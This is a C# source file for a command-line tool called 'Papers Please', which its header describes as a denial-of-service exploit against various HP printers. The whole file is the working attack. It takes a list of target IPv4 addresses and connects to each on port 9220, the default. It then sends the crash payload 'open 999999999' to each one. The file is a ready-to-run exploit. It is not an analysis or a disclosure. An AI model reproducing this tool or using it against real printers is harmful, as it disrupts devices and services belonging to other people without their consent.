// *********************************************************************
// Application:		Papers Please
// Author: 			Hoezee, Joseph D
// Description:		A Denial-of-Service exploit affecting various HP printers.
//                  https://github.com/ReallySecureShell/PapersPlease
// Date Created: 4/15/2020
// *********************************************************************
using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using Mono.Options;

namespace PapersPlease
{
    class MainClass
    {
        public static void Main(string[] args)
        {
            // Create TCP Client named "attacker"
            TcpClient attacker = new TcpClient();

            // Take the raw payload, encode it into ascii, then
            // insert the encoded ascii into a byte array.
            String rawPayload = "open 999999999\n";
            ASCIIEncoding asciiEnc = new ASCIIEncoding();
            byte[] payload = asciiEnc.GetBytes(rawPayload);

            // A regular expression that explicitly matches an IPv4 address.
            Regex IPv4Regex = new Regex(@"^(?:(?:25[0-5]|2?[0-5]?[0-9]?|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2?[0-5]?[0-9]?|[01]?[0-9][0-9]?)$");

            // Variables for the options menu
            List<string> Ipv4_Addr = new List<string>();
            int port = 9220;
            bool ShowHelp = false;

            // Command-line options and option arguments.
            var p = new OptionSet()
            {
                "Usage: PapersPlease.exe [-vh] [-p=PORT] -t={{\"IPv4 ...\"}}",
                "",
                { "t=","The IPv4 address of the printer.",v => Ipv4_Addr.Add(v)},
                { "p=","Change the default port. Default: 9220.",(int v) => port = v},
                { "v","Print version information then exit.",v => { if (v != null) Console.WriteLine("Version: 1.0.0 - Minor Irritation");}},
                { "h", "Print this help page then exit.", v => ShowHelp = v != null}
            };

            List<string> TestArgs = new List<string>();
            try
            {
                // Throws a generic "cannot parse" error if one is encountered.
                TestArgs = p.Parse(args);

                // If the user didn't input an IP address, raise an exception.
                if (Ipv4_Addr[0] == null && ShowHelp) {}
            }
            catch (OptionException err) // generic option error
            {
                Console.WriteLine(err.Message);
                Console.WriteLine("Try -h for more information.");
                return;
            }
            catch (ArgumentOutOfRangeException) // Gets thrown if the Ipv4_Addr list is empty.
            {
                // Show the help page, then exit. Else display an error.
                if (ShowHelp)
                {
                    p.WriteOptionDescriptions(Console.Out);
                    return;
                }
                else
                {
                    Console.WriteLine("Application requires a minimum of one -t flag.");
                    Console.WriteLine("Try -h for more information.");
                }
            }

            // Take each item from the Ipv4_Addr list and
            // loop through them as 'printer'
            foreach (string printer in Ipv4_Addr)
            {
                // Upon encountering a space in the 'printer' string, split the
                // string nth number of times, depending on the amount of spaces.
                foreach (string multipleIPv4Addresses in printer.Split())
                {
                    // Attempt to make connection and send the payload to the target.
                    try
                    {
                        // Match IP against the regular expression.
                        Match match = IPv4Regex.Match(multipleIPv4Addresses);

                        // If the match isn't successful, throw an error with a message detailing why it failed.
                        if (! match.Success)
                        {
                            // In my research, this is an inefficient way to throw a custom error message, as a new object is created (or recreated).
                            throw new Exception("Invalid IPv4 address: " + multipleIPv4Addresses);
                        }

                        // Connect to the printer
                        attacker.Connect(multipleIPv4Addresses,port);
                        Console.WriteLine("Connected");

                        // Send the payload
                        NetworkStream stream = attacker.GetStream();
                        stream.Write(payload,0,payload.Length);
                        Console.WriteLine("Payload sent");

                        // Close TCP connection. Sends a TCP FIN,ACK.
                        attacker.Close();
                    }
                    catch (SocketException sock) // Exception for a socket related error.
                    {
                        Console.WriteLine("Socket Exception: " + sock.Message);
                    }
                    catch (Exception err) // General exception for all other errors.
                    {
                        Console.WriteLine("Exception: " + err.Message);
                    }
                }
            }
        }
    }
}